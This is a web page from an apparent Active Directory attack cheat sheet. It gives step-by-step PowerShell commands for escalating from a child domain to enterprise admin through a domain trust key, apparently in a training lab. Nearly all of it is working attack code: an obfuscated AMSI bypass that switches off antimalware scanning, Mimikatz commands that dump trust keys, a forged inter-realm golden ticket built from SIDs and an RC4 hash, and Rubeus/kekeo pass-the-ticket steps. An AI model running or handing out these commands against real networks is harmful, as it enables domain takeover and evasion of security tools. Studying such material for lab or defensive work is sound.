---
layout: page
title: "# Domain access, PrivEsc to EntAdmin using Domain Trustkey"
permalink: /ad_cheatsheets/domain_access_privesc_to_entadmin_with_trustkey
---

# Domain access, PrivEsc to EntAdmin using Domain Trustkey

## Getting Trust Key

```powershell
powershell -ep bypass

$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Enter-PSSession -Session $sess

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

exit

Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession -Session $sess

Invoke-Mimikatz -Command '"lsadump::trust /patch"'

```

W**ith Mimikatz only:**

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Create inter-realm TGT

```powershell

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
```

## Create TGS for CIFS Service

```powershell
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

## Present TGS to Target Service - kirbikator

```powershell
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirb
```

## Present TGS to Target Service - Rebeus

```powershell
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi/service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

## Resources

[Escalate Domain privileges](https://medium.com/redteam-blueteam-series/escalate-domain-privileges-e53ae4027856)
